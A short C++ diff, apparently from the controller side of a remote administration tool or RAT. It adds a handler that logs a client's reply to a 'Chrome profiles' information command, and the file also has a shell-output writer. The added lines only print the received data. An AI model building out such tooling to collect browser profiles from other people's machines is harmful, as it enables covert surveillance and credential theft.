@@ -488,6 +488,12 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
         return;
     }
 
+    //mod informacion - Lista perfiles chrome
+    if (iComando == EnumComandos::INF_Chrome_Profiles_Out) {
+        DEBUG_MSG(paquete.cBuffer.data());
+        return;
+    }
+
 }
 
 void Cliente_Handler::EscribirSalidaShell(const char*& cBuffer) {
